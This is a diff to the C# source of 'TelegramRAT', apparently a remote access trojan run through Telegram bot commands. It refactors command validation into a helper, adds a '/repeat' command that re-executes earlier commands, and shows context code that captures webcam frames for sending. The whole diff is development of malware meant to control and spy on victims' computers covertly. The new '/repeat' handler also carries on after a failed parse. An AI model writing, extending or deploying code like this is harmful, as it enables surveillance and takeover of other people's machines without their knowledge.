@@ -42,7 +42,7 @@ namespace TelegramRAT
 
         static void Main(string[] args)
         {
-            
+
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
@@ -133,11 +133,7 @@ namespace TelegramRAT
                 if (cmd == null)
                     continue;
 
-                if ((cmd.IgnoreCountArgs || cmd.CountArgs != 0) && model.Args.Length != 0)
-                {
-                    cmd.Execute.Invoke(model, update);
-                }
-                else if (!(cmd.IgnoreCountArgs || cmd.CountArgs != 0) || cmd.MayHaveNoArgs)
+                if (ValidateModel(cmd, model))
                 {
                     cmd.Execute.Invoke(model, update);
                 }
@@ -148,6 +144,28 @@ namespace TelegramRAT
                 }
 
             }
+        }
+
+        //Evil and scary method
+        static bool ValidateModel(BotCommand command, BotCommandModel model)
+        {
+            if (command == null || model == null)
+                return false;
+
+            if (command.Command != model.Command)
+                return false;
+
+            if ((command.IgnoreCountArgs || command.CountArgs != 0) && model.Args.Length != 0)
+            {
+                return true;
+            }
+            else if (!(command.IgnoreCountArgs || command.CountArgs != 0) || command.MayHaveNoArgs)
+            {
+                return true;
+            }
+
+            return false;
+
         }
 
         static string GetWindowsVersion()
@@ -704,7 +722,7 @@ namespace TelegramRAT
                                 device.NewFrame += (sender, args) =>
                                 {
                                     //args.Frame = webcamShotStream;
-                                   
+
                                     endMap = args.Frame.Clone() as Bitmap;
                                     endMap.Save(webcamShotStream, ImageFormat.Png);
                                     (sender as VideoCaptureDevice).SignalToStop();
@@ -1723,6 +1741,29 @@ namespace TelegramRAT
                     {
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Ping!", replyToMessageId: update.Message.MessageId); ;
                     });
+                }
+            });
+
+            //REPEAT
+            CommandsList.Add(new BotCommand
+            {
+                Command = "/repeat",
+
+                Execute = (model, update) =>
+                {
+                    BotCommandModel newmodel = BotCommand.Parse(update.Message.ReplyToMessage.Text);
+
+                    if (newmodel == null)
+                    {
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Unable to repeat command from this message");
+                    }
+
+                    var cmd = CommandsList.Find(command => command.Command == newmodel.Command);
+
+                    if (ValidateModel(cmd, newmodel))
+                        cmd.Execute(newmodel, update);
+                    else
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Unable to repeat command from this message");
                 }
             });
 
